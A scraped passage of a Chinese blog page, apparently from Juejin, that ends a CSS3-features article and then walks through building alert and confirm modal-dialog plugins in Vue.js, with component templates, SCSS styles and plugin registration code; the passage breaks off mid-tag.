src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;554&quot; height=&quot;398&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40e15f33113?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"551\" data-height=\"401\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;551&quot; height=&quot;401&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40e4c2a6a68?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"544\" data-height=\"400\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;544&quot; height=&quot;400&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40e2f8a0a1b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"568\" data-height=\"402\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;568&quot; height=&quot;402&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40e5ad4befa?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"555\" data-height=\"391\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;555&quot; height=&quot;391&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40ec2e01e59?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"563\" data-height=\"404\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;563&quot; height=&quot;404&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40e9a09db9f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"553\" data-height=\"400\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;553&quot; height=&quot;400&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40ecebd64e9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"556\" data-height=\"399\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;556&quot; height=&quot;399&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40eded5de01?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"551\" data-height=\"396\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;551&quot; height=&quot;396&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40f0002be93?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"560\" data-height=\"400\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;560&quot; height=&quot;400&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40f1191dcad?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"558\" data-height=\"400\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;558&quot; height=&quot;400&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40f496a327b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"547\" data-height=\"402\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;547&quot; height=&quot;402&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40f61d8f918?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"551\" data-height=\"395\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;551&quot; height=&quot;395&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-53\">20.小结</h2><p>好了，个人总结的css3的新特性，就到这里了！其中有一些新特性如果想使用的好，必须多去了解和练习。有些新特性，如果要单独详细的讲，比如动画，过渡，弹性盒子，渐变等。估计可以写几篇或者十几篇文章！特别是动画，估计写一本书都可以！上面对css3新特性的讲解和案例，都是基础的认识和用法，希望能起到一个拓展思维的作用。最重要的是，大家要多加练习，实操是最重要的一环，孰能生巧也是这样来的！css3不仅要会用，也要用好，用好css3，在项目的开发上，很有帮助的！当然如果我有发现什么好玩的，有用的，我会继续写文章。<br>最后，如果大家觉得我哪里写错了，写得不好，或者有什么推荐的！欢迎指点！</p><p><br></p><p><br></p><p>-------------------------华丽的分割线--------------------<br>想了解更多，关注关注我的微信公众号：守候书阁</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d33b27d3f303a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"258\" data-height=\"258\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;258&quot; height=&quot;258&quot;&gt;&lt;/svg&gt;\"></p><p><br></p></div>"},null,{"title":"vue插件开发练习--实用弹窗","avatar":"https://user-gold-cdn.xitu.io/2017/7/18/64d82b70650d11ed806f611d929c7b1e?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"守候i","create_time":"2017 年 11 月 29 日","tags":["Vue.js","JavaScript"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 data-id=\"heading-0\">1.前言</h2><p>上回说了组件（<a href=\"https://link.juejin.im?target=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000011141625\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">vue组件开发练习--焦点图切换</a>）的一个练习项目，这次换下口味，说下vue的插件练手的项目。相对于现在之前的焦点图切换的组件，这个可能就更简单了，基本就是熟悉下插件开发的步骤就可以了！这个项目，我更建议大家动手练习了，这个弹窗比之前的焦点图更加的实用性，也更常用。同时也能让大家熟悉下vue的插件开发的流程。代码同样，我会上传到github（<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FchenhuiYj%2Fec-dialog\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ec-dialog</a>），需要的可以直接去看代码！</p><blockquote><p><b>建议</b><br><b>1.下面的步骤，最好在自己本地上跑起来，根据文章的步骤，逐步完成，如果只看代码，很容易懵逼的。 </b><br><b>2.如果不清楚哪个代码有什么作用，可能自己调试下，把代码去掉后，看下有什么影响，就很容易想出代码有什么作用了！</b></p></blockquote><h2 data-id=\"heading-1\">2.项目目录</h2><p><img class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf45a02d2f02f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"648\" data-height=\"629\" src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf45a02d2f02f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"></p><p>还是一个很简单的目录，各个目录不知道有什么用的，可以移步去看我上一篇文章。和组件开发的目录相比，区别就在于<code>src/js/components</code>这个文件夹上。</p><h2 data-id=\"heading-2\">3.开发过程</h2><h3 data-id=\"heading-3\">3-1.把项目跑起来</h3><p>首先，先弄<code>src/js/components/alert</code>这个组件。还是一样，，先在<code>src/js/components/alert/src/main.vue</code>。输出‘守候’。代码如下</p><pre class=\"hljs bash\"><code>&lt;template&gt;\n    &lt;transition name=<span class=\"hljs-string\">\"ec\"</span>&gt;\n        &lt;div class=<span class=\"hljs-string\">\"ec\"</span>&gt;\n            守候\n        &lt;/div&gt;\n    &lt;/transition&gt;\n&lt;/template&gt;\n&lt;script&gt;\n    <span class=\"hljs-built_in\">export</span> default {\n        <span class=\"hljs-function\"><span class=\"hljs-title\">data</span></span> () {\n            <span class=\"hljs-built_in\">return</span> {\n                name: <span class=\"hljs-string\">'ec-alert'</span>,\n            }\n        },\n        computed: {},\n        <span class=\"hljs-function\"><span class=\"hljs-title\">mounted</span></span> () {\n        },\n        methods: {\n        }\n    }\n&lt;/script&gt;\n</code></pre><p>然后来到<code>'alert/index.js'</code>。这个术语叫什么什么文件，我不太清楚，暂时就叫，插件配置文件吧！代码如下（注意看注释）</p><pre class=\"hljs bash\"><code>import Vue from <span class=\"hljs-string\">'vue'</span>\nimport AlertComponent from <span class=\"hljs-string\">'./src/main.vue'</span>\n//合并对象函数，这个方法是会改变，第一个参数的值的\n<span class=\"hljs-keyword\">function</span> merge(target) {\n    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-built_in\">let</span> i = 1, j = arguments.length; i &lt; j; i++) {\n        <span class=\"hljs-built_in\">let</span> <span class=\"hljs-built_in\">source</span> = arguments[i] || {};\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-built_in\">let</span> prop <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">source</span>) {\n            <span class=\"hljs-keyword\">if</span> (source.hasOwnProperty(prop)) {\n                <span class=\"hljs-built_in\">let</span> value = <span class=\"hljs-built_in\">source</span>[prop];\n                <span class=\"hljs-keyword\">if</span> (value !== undefined) {\n                    target[prop] = value;\n                }\n            }\n        }\n    }\n    <span class=\"hljs-built_in\">return</span> target;\n};\n<span class=\"hljs-built_in\">let</span> instance;\n//extend 是构造一个组件的语法器.传入参数，返回一个组件\n<span class=\"hljs-built_in\">let</span> AlertConstructor = Vue.extend(AlertComponent);\n\n<span class=\"hljs-built_in\">let</span> initInstance = ()=&gt;{\n    //实例化ConfirmConstructor组件\n    instance = new AlertConstructor({\n        el: document.createElement(<span class=\"hljs-string\">'div'</span>)\n    });\n    //添加到boby\n    document.body.appendChild(instance.<span class=\"hljs-variable\">$el</span>);\n}\n\n<span class=\"hljs-built_in\">let</span> Alert = (options={}) =&gt; {\n    //初始化\n    initInstance();\n    // 将单个 confirm instance 的配置合并到默认值（instance.<span class=\"hljs-variable\">$data</span>，就是main.vue里面的data）中\n    merge(instance.<span class=\"hljs-variable\">$data</span>, options);\n    //返回Promise\n    <span class=\"hljs-built_in\">return</span> new Promise((resolve, reject)=&gt;{\n        instance.show = <span class=\"hljs-literal\">true</span>;\n        <span class=\"hljs-built_in\">let</span> success = instance.success;\n        <span class=\"hljs-built_in\">let</span> cancel = instance.cancel;\n        instance.success = () =&gt; {\n            //先执行instance.success（main.vue里面的success函数）\n            success();\n            //再执行自定义函数\n            resolve(<span class=\"hljs-string\">'ok'</span>);\n        }\n    });\n\n}\n<span class=\"hljs-built_in\">export</span> default Alert;</code></pre><p>然后来到<code>components/js/index.js</code>这个文件，配置组件和API，代码如下</p><pre class=\"hljs bash\"><code>import alert from <span class=\"hljs-string\">'./alert/index.js'</span>\n\nconst install = <span class=\"hljs-keyword\">function</span>(Vue) {\n    //注册全局组件\n    Vue.component(alert.name, alert)\n    //添加全局API\n    Vue.prototype.<span class=\"hljs-variable\">$alert</span> = alert\n}\n<span class=\"hljs-built_in\">export</span> default install</code></pre><p>然后在模板文件，<code>index.html</code>里面设置一个div,方便挂载测试</p><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=<span class=\"hljs-string\">\"en\"</span>&gt;\n&lt;meta name=<span class=\"hljs-string\">\"viewport\"</span> content=<span class=\"hljs-string\">\"width=device-width, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0\"</span>&gt;\n&lt;head&gt;\n    &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div id=<span class=\"hljs-string\">\"app\"</span>&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;  </code></pre><p>然后在入口文件<code>index.js</code>里面，使用插件</p><pre class=\"hljs bash\"><code>require(<span class=\"hljs-string\">\"./index.html\"</span>);\n//引入sass\nrequire(<span class=\"hljs-string\">\"./src/sass/com.scss\"</span>);\nimport Vue from <span class=\"hljs-string\">'vue'</span>\nimport dialog from <span class=\"hljs-string\">'./src/js/components/index'</span>;\nVue.use(dialog)\n<span class=\"hljs-built_in\">let</span> App = new Vue({\n    el: <span class=\"hljs-string\">'#app'</span>,\n    <span class=\"hljs-function\"><span class=\"hljs-title\">data</span></span>(){\n        <span class=\"hljs-built_in\">return</span> {\n            <span class=\"hljs-string\">'name'</span>: <span class=\"hljs-string\">'index'</span>\n        }\n    },\n    <span class=\"hljs-function\"><span class=\"hljs-title\">mounted</span></span>(){\n        this.<span class=\"hljs-variable\">$alert</span>();\n    }\n});</code></pre><p>然后，命令行 <code>$ npm run dev</code>，结果完美</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf459fb9634a6?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"256\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;256&quot;&gt;&lt;/svg&gt;\"></p><h3 data-id=\"heading-4\">3-2.样式修改</h3><p>完成了上一步，这个插件的一大半就算完成了！剩下的工作主要开发的就是在<code>components/../main.vue</code>这文件开发。<br>首先，先别急写代码，想一下，一个弹窗大概需要什么字段。</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf459d8089500?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"416\" data-height=\"174\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;416&quot; height=&quot;174&quot;&gt;&lt;/svg&gt;\"></p><p>参考上面，发现有一个标题，一个内容，一个按钮文字。最后还需要一个变量，控制弹窗是否显示。然后一个点击按钮的操作函数。然后还有样式，大概如下</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf459e8e16bcb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"373\" data-height=\"444\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;373&quot; height=&quot;444&quot;&gt;&lt;/svg&gt;\"></p><p>样式这个不多说，其他的字段，一个萝卜一个坑的填进去就好，代码如下</p><pre class=\"hljs bash\"><code>&lt;template&gt;\n    &lt;transition name=<span class=\"hljs-string\">\"ec\"</span>&gt;\n        &lt;div v-if=<span class=\"hljs-string\">\"show\"</span> class=<span class=\"hljs-string\">\"ec\"</span>&gt;\n            &lt;div class=<span class=\"hljs-string\">\"ec-box\"</span>&gt;\n                &lt;div class=<span class=\"hljs-string\">\"ec-box-inner\"</span>&gt;\n                    &lt;!--标题--&gt;\n                    &lt;div class=<span class=\"hljs-string\">\"ec-title\"</span> v-if=<span class=\"hljs-string\">\"title\"</span>&gt;{{title}}&lt;/div&gt;\n                    &lt;!--内容--&gt;\n                    &lt;div class=<span class=\"hljs-string\">\"ec-content\"</span>&gt;{{content}}&lt;/div&gt;\n                &lt;/div&gt;\n                &lt;!--按钮--&gt;       \n                &lt;div class=<span class=\"hljs-string\">\"ec-box-buttons\"</span>&gt;\n                    &lt;span class=<span class=\"hljs-string\">\"ec-btn-success\"</span> @click=<span class=\"hljs-string\">\"success\"</span>&gt;{{submitText}}&lt;/span&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/transition&gt;\n&lt;/template&gt;\n&lt;script&gt;\n    <span class=\"hljs-built_in\">export</span> default {\n        <span class=\"hljs-function\"><span class=\"hljs-title\">data</span></span> () {\n            <span class=\"hljs-built_in\">return</span> {\n                name:<span class=\"hljs-string\">'ec-alert'</span>,\n                show: <span class=\"hljs-literal\">false</span>,\n                title: <span class=\"hljs-string\">'提示'</span>,\n                content: <span class=\"hljs-string\">''</span>,\n                submitText: <span class=\"hljs-string\">'确定'</span>,\n                cancelText: <span class=\"hljs-string\">'取消'</span>\n            }\n        },\n        computed: {},\n        <span class=\"hljs-function\"><span class=\"hljs-title\">mounted</span></span> () {\n        },\n        methods: {\n            //按钮事件\n            <span class=\"hljs-function\"><span class=\"hljs-title\">success</span></span> () {\n                this.show = <span class=\"hljs-literal\">false</span>;\n            }\n        }\n    }\n&lt;/script&gt;\n&lt;style lang=<span class=\"hljs-string\">\"scss\"</span> scoped&gt;\n\n    .ec {\n        background: rgba(00, 00, 00, .5);\n        position: fixed;\n        left: 0;\n        top: 0;\n        width: 100%;\n        height: 100%;\n        .ec-box {\n            width: 80%;\n            max-width: 400px;\n            top: 200px;\n            position: absolute;\n            left: 0;\n            right: 0;\n            margin: auto;\n            background: <span class=\"hljs-comment\">#fff;</span>\n            box-sizing: border-box;\n            padding: 20px;\n            border-radius: 6px;\n\n        }\n        .ec-title {\n            padding-left: 0;\n            margin-bottom: 0;\n            font-size: 16px;\n            font-weight: 700;\n            height: 18px;\n            color: <span class=\"hljs-comment\">#333;</span>\n        }\n        .ec-content {\n            padding: 14px 0;\n            line-height: 24px;\n            color: <span class=\"hljs-comment\">#48576a;</span>\n            font-size: 14px;\n        }\n        .ec-box-buttons {\n            text-align: right;\n        }\n        .ec-btn-success {\n            background: <span class=\"hljs-comment\">#20a0ff;</span>\n            border-color: <span class=\"hljs-comment\">#20a0ff;</span>\n            display: inline-block;\n            line-height: 1;\n            white-space: nowrap;\n            cursor: pointer;\n            color: <span class=\"hljs-comment\">#fff;</span>\n            margin: 0;\n            padding: 10px 15px;\n            border-radius: 4px;\n        }\n        .ec-btn-cancel {\n            display: inline-block;\n            line-height: 1;\n            white-space: nowrap;\n            cursor: pointer;\n            background: <span class=\"hljs-comment\">#fff;</span>\n            border: 1px solid <span class=\"hljs-comment\">#c4c4c4;</span>\n            color: <span class=\"hljs-comment\">#1f2d3d;</span>\n            margin: 0;\n            padding: 10px 15px;\n            border-radius: 4px;\n        }\n    }\n    .ec-enter {\n        opacity: 0;\n        .ec-box {\n            transform:scale(0);\n        }\n    }\n\n    .ec-enter-active {\n        transition: opacity .4s;\n        .ec-box {\n            transition: transform .4s;\n        }\n    }\n    .ec-leave-active{\n        transition: opacity .2s;\n        .ec-box {\n            transition: transform .2s;\n        }\n    }\n    .ec-leave-active {\n        opacity: 0;\n    }\n&lt;/style&gt;\n</code></pre><p>运行效果</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf459e8ca04c1?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"374\" data-height=\"273\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;374&quot; height=&quot;273&quot;&gt;&lt;/svg&gt;\"></p><h3 data-id=\"heading-5\">3-3.使用插件</h3><p>大家知道，在前面步骤，<code>'alert/index.js'</code>这里就已经返回的一个Promise。所以，用法就是像Promise那样使用！</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/29/1600372554b8c532?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"734\" data-height=\"395\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;734&quot; height=&quot;395&quot;&gt;&lt;/svg&gt;\"><br></p><p>所以在入口文件，<code>index.js</code>里面直接写</p><pre class=\"hljs bash\"><code><span class=\"hljs-function\"><span class=\"hljs-title\">mounted</span></span>(){\n    this.<span class=\"hljs-variable\">$alert</span>({\n        title:<span class=\"hljs-string\">'提示2'</span>,\n        content:<span class=\"hljs-string\">'这里是提示内容2'</span>\n    }).then(()=&gt;{\n        this.name=<span class=\"hljs-string\">'守候'</span>\n        alert(this.name)\n    })\n}\n</code></pre><p>运行效果</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf45a6bef7383?imageslim\" data-width=\"800\" data-height=\"628\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;628&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-6\">4.其它弹窗</h2><p>还是那句话，程序员不会满足于现状，只有一种弹窗，怎么够，下面我再增加一种，和上面那个基本一样，就是多了一个取消按钮而已。<br>这里我就再讲一个简单的栗子，至于弹窗的样式，太多了，我在这里就不展开说了，大家需要的可进行拓展。</p><p>首先，创建这个目录（可以直接把alert那个目录拷贝过来，然后再修改几下就完事了）</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf45a61827211?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"514\" data-height=\"227\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;514&quot; height=&quot;227&quot;&gt;&lt;/svg&gt;\"></p><p>然后，针对<code>comfirm/src/main.vue</code>文件，添加下面的代码（下面的代码基本就是从<code>alert/src/main.vue</code>拷贝过来的，就是增加一个取消按钮的对应一个字段和操作函数）</p><pre class=\"hljs bash\"><code>&lt;template&gt;\n    &lt;transition name=<span class=\"hljs-string\">\"ec\"</span>&gt;\n        &lt;div v-if=<span class=\"hljs-string\">\"show\"</span> class=<span class=\"hljs-string\">\"ec\"</span>&gt;\n            &lt;div class=<span class=\"hljs-string\">\"ec-box\"</span>&gt;\n                &lt;div class=<span class=\"hljs-string\">\"ec-box-inner\"</span>&gt;\n                    &lt;!--标题--&gt;\n                    &lt;div class=<span class=\"hljs-string\">\"ec-title\"</span> v-if=<span class=\"hljs-string\">\"title\"</span>&gt;{{title}}&lt;/div&gt;\n                    &lt;!--内容--&gt;\n                    &lt;div class=<span class=\"hljs-string\">\"ec-content\"</span>&gt;{{content}}&lt;/div&gt;\n                &lt;/div&gt;\n                &lt;!--按钮--&gt;\n                &lt;div class=<span class=\"hljs-string\">\"ec-box-buttons\"</span>&gt;\n                    &lt;span class=<span class=\"hljs-string\">\"ec-btn-success\"</span> @click=<span class=\"hljs-string\">\"success\"</span>&gt;{{submitText}}&lt;/span&gt;\n                    &lt;span class=<span class=\"hljs-string\">\"ec-btn-cancel\"</span> @click=<span class=\"hljs-string\">\"cancel\"</span>&gt;{{cancelText}}&lt;/span&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/transition&gt;\n&lt;/template&gt;\n&lt;script&gt;\n    <span class=\"hljs-built_in\">export</span> default {\n        <span class=\"hljs-function\"><span class=\"hljs-title\">data</span></span> () {\n            <span class=\"hljs-built_in\">return</span> {\n                name:<span class=\"hljs-string\">'ec-comfirm'</span>,\n                show: <span class=\"hljs-literal\">false</span>,\n                title: <span class=\"hljs-string\">'提示'</span>,\n                content: <span class=\"hljs-string\">''</span>,\n                submitText: <span class=\"hljs-string\">'确定'</span>,\n                cancelText: <span class=\"hljs-string\">'取消'</span>\n            }\n        },\n        computed: {},\n        <span class=\"hljs-function\"><span class=\"hljs-title\">mounted</span></span> () {\n        },\n        methods: {\n            //确定按钮事件\n            <span class=\"hljs-function\"><span class=\"hljs-title\">success</span></span> () {\n                this.show = <span class=\"hljs-literal\">false</span>;\n            },\n            //取消按钮事件\n            <span class=\"hljs-function\"><span class=\"hljs-title\">cancel</span></span> () {\n                this.show = <span class=\"hljs-literal\">false</span>;\n            }\n        }\n    }\n&lt;/script&gt;\n&lt;style lang=<span class=\"hljs-string\">\"scss\"</span> scoped&gt;\n    .ec {\n        background: rgba(00, 00, 00, .5);\n        position: fixed;\n        left: 0;\n        top: 0;\n        width: 100%;\n        height: 100%;\n        z-index: 9999;\n        .ec-box {\n            width: 80%;\n            max-width: 400px;\n            top: 200px;\n            position: absolute;\n            left: 0;\n            right: 0;\n            margin: auto;\n            background: <span class=\"hljs-comment\">#fff;</span>\n            box-sizing: border-box;\n            padding: 20px;\n            border-radius: 6px;\n\n        }\n        .ec-title {\n            padding-left: 0;\n            margin-bottom: 0;\n            font-size: 16px;\n            font-weight: 700;\n            height: 18px;\n            color: <span class=\"hljs-comment\">#333;</span>\n        }\n        .ec-content {\n            padding: 14px 0;\n            line-height: 24px;\n            color: <span class=\"hljs-comment\">#48576a;</span>\n            font-size: 14px;\n        }\n        .ec-box-buttons {\n            text-align: right;\n        }\n        .ec-btn-success {\n            background: <span class=\"hljs-comment\">#20a0ff;</span>\n            border-color: <span class=\"hljs-comment\">#20a0ff;</span>\n            display: inline-block;\n            line-height: 1;\n            white-space: nowrap;\n            cursor: pointer;\n            color: <span class=\"hljs-comment\">#fff;</span>\n            margin: 0;\n            padding: 10px 15px;\n            border-radius: 4px;\n        }\n        .ec-btn-cancel {\n            display: inline-block;\n            line-height: 1;\n            white-space: nowrap;\n            cursor: pointer;\n            background: <span class=\"hljs-comment\">#fff;</span>\n            border: 1px solid <span class=\"hljs-comment\">#c4c4c4;</span>\n            color: <span class=\"hljs-comment\">#1f2d3d;</span>\n            margin: 0;\n            padding: 10px 15px;\n            border-radius: 4px;\n        }\n    }\n    .ec-enter {\n        opacity: 0;\n        .ec-box {\n            transform:scale(0);\n        }\n    }\n\n    .ec-enter-active {\n        transition: opacity .4s;\n        .ec-box {\n            transition: transform .4s;\n        }\n    }\n    .ec-leave-active{\n        transition: opacity .2s;\n        .ec-box {\n            transition: transform .2s;\n        }\n    }\n    .ec-leave-active {\n        opacity: 0;\n    }\n&lt;/style&gt;\n</code></pre><p>然后就是<code>comfirm/index.js</code>(也是基本拷贝的，我就截图，告诉大家改哪里吧，这个得稍微细看才知道改哪里)</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf45a646ba145?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"592\" data-height=\"800\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;592&quot; height=&quot;800&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf45a63addf03?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"513\" data-height=\"526\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;513&quot; height=&quot;526&quot;&gt;&lt;/svg&gt;\"></p><p>然后<code>components/index.js</code></p><pre class=\"hljs bash\"><code>import comfirm from <span class=\"hljs-string\">'./comfirm/index.js'</span>\nimport alert from <span class=\"hljs-string\">'./alert/index.js'</span>\n\nconst install = <span class=\"hljs-keyword\">function</span>(Vue) {\n    //注册全局组件\n    Vue.component(comfirm.name, comfirm)\n    Vue.component(alert.name, alert)\n    //添加全局API\n    Vue.prototype.<span class=\"hljs-variable\">$confirm</span> = comfirm\n    Vue.prototype.<span class=\"hljs-variable\">$alert</span> = alert\n}\n<span class=\"hljs-built_in\">export</span> default install</code></pre><p>最后在入口文件，<code>index.js</code>使用</p><pre class=\"hljs bash\"><code>require(<span 